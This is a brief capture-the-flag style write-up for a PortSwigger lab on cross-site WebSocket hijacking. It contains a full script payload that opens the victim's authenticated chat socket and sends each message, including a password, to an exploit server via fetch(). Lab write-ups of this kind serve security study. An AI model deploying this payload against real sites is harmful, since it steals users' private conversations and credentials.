# [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

> during websocket handshake there is no `CSRF` and the server accepts any origins until the session cookie is right for the user, and the `READY` message will send all the previous messages as response

- add it tot the exploit server:

```
<script>
  var ws = new WebSocket("wss://xxx.web-security-academy.net/chat");
  ws.onopen = function () {
    ws.send("READY");
  };
  ws.onmessage = function (event) {
    fetch("https://yyy.exploit-server.net/exploit?message=" + JSON.stringify(event.data));
  };
</script>
```

- deliver it to the victim and check the logs on the exploit server
- in the logs there will be a message about the password
